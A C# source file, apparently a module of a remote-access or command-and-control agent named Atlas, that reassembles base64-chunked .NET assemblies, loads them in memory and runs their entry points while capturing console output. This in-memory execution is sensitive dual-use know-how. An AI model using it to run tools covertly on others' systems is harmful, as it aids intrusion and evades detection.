using System;
using System.Text;
using System.Reflection;
using System.IO;
using System.Collections.Generic;
using System.Linq;

namespace Atlas {
    class AssemblyManagement {
        public static bool Check(string FileId)
        {
            try
            {
                bool a = Config.Modules.ContainsKey(FileId);
                return a;
            }
            catch
            {
                return false;
            }
        }

        public static string GetFullName(string FileId)
        {
            try
            {
                if (Check(FileId))
                {
                    string FullName = Config.Modules[FileId];
                    return FullName;
                }
                else
                {
                    return "";
                }
            }
            catch
            {
                return "";
            }
        }

        public static string ListAssemblies()
        {
            string AssemblyList = "";
            try
            {
                foreach (KeyValuePair<string, string> Entry in Config.Modules)
                {
                    string Module = Encoding.UTF8.GetString(Convert.FromBase64String(Entry.Value));
                    string[] Assembly = Module.Split(',');
                    AssemblyList += Assembly[0] + '\n';
                }
                return AssemblyList;
            }
            catch
            {
                return AssemblyList = "";
            }
        }

        public static bool Load(string FileId, string B64Assembly)
        {
            try
            {
                if (Check(FileId))
                {
                    return false;
                }
                else
                {
                    var a = Assembly.Load(Convert.FromBase64String(B64Assembly));
                    string fullname = Convert.ToBase64String(Encoding.UTF8.GetBytes(a.FullName));
                    Config.Modules.Add(FileId, fullname);
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        public static string Invoke(string FileId, string[] args)
        {
            string output = "";
            try
            {
                string FullName = GetFullName(FileId);
                Assembly[] assems = AppDomain.CurrentDomain.GetAssemblies();
                foreach (Assembly assem in assems)
                {
                    if (assem.FullName == Encoding.UTF8.GetString(Convert.FromBase64String(FullName)))
                    {
                        MethodInfo entrypoint = assem.EntryPoint;
                        object[] arg = new object[] { args };

                        TextWriter realStdOut = Console.Out;
                        TextWriter realStdErr = Console.Error;
                        TextWriter stdOutWriter = new StringWriter();
                        TextWriter stdErrWriter = new StringWriter();
                        Console.SetOut(stdOutWriter);
                        Console.SetError(stdErrWriter);

                        entrypoint.Invoke(null, arg);

                        Console.Out.Flush();
                        Console.Error.Flush();
                        Console.SetOut(realStdOut);
                        Console.SetError(realStdErr);

                        output = stdOutWriter.ToString();
                        output += stdErrWriter.ToString();
                        break;
                    }
                }
                return output;
            }
            catch
            {
                return output;
            }
        }

        public static byte[] GetAssembly(List<string> Chunks, int TotalChunks)
        {
            byte[] FinalAssembly = new byte[] { };
            try
            {
                byte[][] AssemblyArray = new byte[TotalChunks][];
                foreach (string chunk in Chunks)
                {
                    int index = Chunks.IndexOf(chunk);
                    AssemblyArray[index] = Convert.FromBase64String(chunk);
                }
                FinalAssembly = Combine(AssemblyArray);
                return FinalAssembly;
            }
            catch
            {
                return FinalAssembly;
            }
        }

        public static byte[] Combine(params byte[][] arrays)
        {
            byte[] rv = new byte[arrays.Sum(a => a.Length)];
            int offset = 0;
            foreach (byte[] array in arrays)
            {
                Buffer.BlockCopy(array, 0, rv, offset, array.Length);
                offset += array.Length;
            }
            return rv;
        }

    }
}